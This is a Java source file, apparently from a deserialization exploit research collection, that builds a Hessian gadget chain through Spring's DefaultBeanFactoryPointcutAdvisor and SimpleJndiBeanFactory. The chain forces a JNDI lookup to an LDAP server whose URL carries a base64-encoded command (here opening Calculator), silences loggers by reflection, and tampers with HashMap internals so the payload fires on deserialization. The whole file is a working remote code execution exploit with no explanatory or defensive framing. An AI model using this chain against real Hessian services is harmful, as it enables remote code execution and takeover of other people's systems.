package org.su18.serialize.hessian.SpringAbstractBeanFactoryPointcutAdvisor;

import org.apache.commons.logging.impl.NoOpLog;
import org.jboss.weld.util.reflection.Reflections;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.JndiAccessor;
import org.springframework.jndi.JndiTemplate;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import org.su18.serialize.utils.HessianUtils;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * @author su18
 */
public class SpringAbstractBeanFactoryPointcutAdvisor1 {

	public static void main(String[] args) throws Exception {

		// open -a Calculator.app
		String jndiUrl = "ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==";

		SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
		bf.setShareableResources(jndiUrl);

		Field f = JndiAccessor.class.getDeclaredField("logger");
		f.setAccessible(true);
		f.set(bf, new NoOpLog());

		Field f2 = JndiTemplate.class.getDeclaredField("logger");
		f2.setAccessible(true);
		f2.set(bf.getJndiTemplate(), new NoOpLog());

		DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
		pcadv.setBeanFactory(bf);
		pcadv.setAdviceBeanName(jndiUrl);

		HashMap map = new HashMap();


		// 放入 DefaultBeanFactoryPointcutAdvisor 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(pcadv, "su18");
		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, pcadv, 0, false, true);
			}
		}

		// 放入 DefaultBeanFactoryPointcutAdvisor 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		DefaultBeanFactoryPointcutAdvisor d = new DefaultBeanFactoryPointcutAdvisor();
		map.put(new DefaultBeanFactoryPointcutAdvisor(), "su19");
		Method[] m2 = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m2) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, d, 0, false, true);
			}
		}


		byte[] baos = HessianUtils.hessianSerialize(map, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");

	}

}
